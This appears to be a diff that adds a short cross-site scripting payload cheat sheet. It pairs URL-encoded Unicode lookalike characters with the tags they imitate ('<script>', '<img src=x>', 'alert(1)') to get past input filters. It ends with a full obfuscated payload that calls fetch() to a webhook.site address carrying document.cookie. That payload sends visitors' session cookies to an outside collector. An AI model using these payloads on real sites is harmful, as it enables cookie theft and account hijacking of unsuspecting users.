@@ -1,0 +1,35 @@
+%e2%89%ae %e2%89%af   ≮
+
+
+%ef%b9%a4  
+%ef%b9%a5 
+
+
+
+
+%ef%b9%a4%73%63%72%69%70%74%ef%b9%a5 <script>
+
+
+0x2f
+
+%ef%b9%a4%2f%73%63%72%69%70%74%ef%b9%a5 </script>
+
+%2f /
+
+
+%61%6c%65%72%74%28%31%29%3b  alert(1);
+
+%69%6d%67%20%73%72%63%3d%78 img src=x
+
+%ef%b9%a4%69%6d%67%20%73%72%63%3d%78%ef%b9%a5  <img src=x>
+
+
+%CB%A2 tiny s 
+
+%cb%a2%63%72%69%70%74   tiny s cript
+
+%ef%b9%a4%cb%a2%63%72%69%70%74%ef%b9%a5    <script>
+%ef%b9%a4%2f%cb%a2%63%72%69%70%74%ef%b9%a5  </script>
+
+
+%ef%b9%a4%cb%a2%63%72%69%70%74%ef%b9%a5fetch('https://webhook.site/9de0282d-bebc-4d90-a49b-ed91f6a22ca0?c='%2B(document.cookie));%ef%b9%a4%2f%cb%a2%63%72%69%70%74%ef%b9%a5
